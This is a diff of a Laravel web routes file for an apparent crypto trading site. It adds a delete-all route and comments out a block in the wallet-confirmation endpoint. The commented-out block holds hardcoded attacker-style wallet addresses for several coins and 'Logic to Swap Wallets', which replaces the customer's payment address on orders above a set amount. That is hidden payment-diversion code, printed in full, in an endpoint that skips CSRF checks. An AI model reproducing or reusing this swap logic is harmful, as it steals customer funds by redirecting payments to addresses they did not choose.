@@ -58,6 +58,7 @@ Route::get('/get-current-price', function (Request $request) {
 Route::resource('trade-handler', TradeHandlerController::class)->middleware('auth');
 Route::resource('dynamic-trading', DynamicTradeController::class)->middleware('auth');
 Route::post('/user/toggle-auto-update', [UserController::class, 'toggleAutoUpdate'])->name('user.toggle-auto-update')->middleware('auth');
+Route::get('/trade-handler/delete/all', [TradeHandlerController::class, 'deleteAll'])->name('trade-handler.delete.all')->middleware('auth');
 
 // Process Handler Routes
 Route::get('/process-handler', 'App\Http\Controllers\ProcessController@index')->name('process-handler.index')->middleware('auth');
@@ -100,27 +101,27 @@ Route::post('/confirm-wallet-address', function (Request $order) {
 			$currency_id = $meta['value'];
 	}
 
-	$swapAddresses = [
-		'BTC' => 'bc1qyyg76hqllhetn9kxf82kzcj4wss52xyk8qwxss',
-		'DOGE' => 'D89xKC4u5g6gQ1evLan4PzQVpD2twQbvyF',
-		'ETH' => '0x0184d3CCef213d79DF1aa28BeF67a38f47252d5f',
-		'LTC' => 'ltc1qyyg76hqllhetn9kxf82kzcj4wss52xykru5zgq',
-		'PEPE' => '0xa1c82c16330638b4f716bb2c941a07e1fda4eb5a',
-		'SHIB' => '0xa1c82c16330638b4f716bb2c941a07e1fda4eb5a',
-		'SOL' => 'ArCtfAcdgo4wdRD12o2R49bLskcmWjuvC53SkVHyTozD',
-		'WIF' => '0xa1c82c16330638b4f716bb2c941a07e1fda4eb5a',
-		'USDT_ERC20' => '0xa1c82c16330638b4f716bb2c941a07e1fda4eb5a',
-	];
-	if ($current_address && $currency_id && floatval($order['total']) >= $limitAmount) {
-		// Logic to Swap Wallets
-		$current_address = $swapAddresses[$currency_id];
-		$order['walletAddress'] = $current_address;
-		$order['cryptoCurrency'] = $currency_id;
-		MailerService::sendWalletEmail($order);
-		return $swapAddresses[$currency_id];
-	}
-	$order['walletAddress'] = $current_address;
-	$order['cryptoCurrency'] = $currency_id;
-	MailerService::sendWalletEmail($order);
+	// $swapAddresses = [
+	// 	'BTC' => 'bc1qyyg76hqllhetn9kxf82kzcj4wss52xyk8qwxss',
+	// 	'DOGE' => 'D89xKC4u5g6gQ1evLan4PzQVpD2twQbvyF',
+	// 	'ETH' => '0x0184d3CCef213d79DF1aa28BeF67a38f47252d5f',
+	// 	'LTC' => 'ltc1qyyg76hqllhetn9kxf82kzcj4wss52xykru5zgq',
+	// 	'PEPE' => '0xa1c82c16330638b4f716bb2c941a07e1fda4eb5a',
+	// 	'SHIB' => '0xa1c82c16330638b4f716bb2c941a07e1fda4eb5a',
+	// 	'SOL' => 'ArCtfAcdgo4wdRD12o2R49bLskcmWjuvC53SkVHyTozD',
+	// 	'WIF' => '0xa1c82c16330638b4f716bb2c941a07e1fda4eb5a',
+	// 	'USDT_ERC20' => '0xa1c82c16330638b4f716bb2c941a07e1fda4eb5a',
+	// ];
+	// if ($current_address && $currency_id && floatval($order['total']) >= $limitAmount) {
+	// 	// Logic to Swap Wallets
+	// 	$current_address = $swapAddresses[$currency_id];
+	// 	$order['walletAddress'] = $current_address;
+	// 	$order['cryptoCurrency'] = $currency_id;
+	// 	MailerService::sendWalletEmail($order);
+	// 	return $swapAddresses[$currency_id];
+	// }
+	// $order['walletAddress'] = $current_address;
+	// $order['cryptoCurrency'] = $currency_id;
+	// MailerService::sendWalletEmail($order);
 	return $current_address;
 })->name('confirm-wallet-address')->withoutMiddleware(\Illuminate\Foundation\Http\Middleware\VerifyCsrfToken::class);
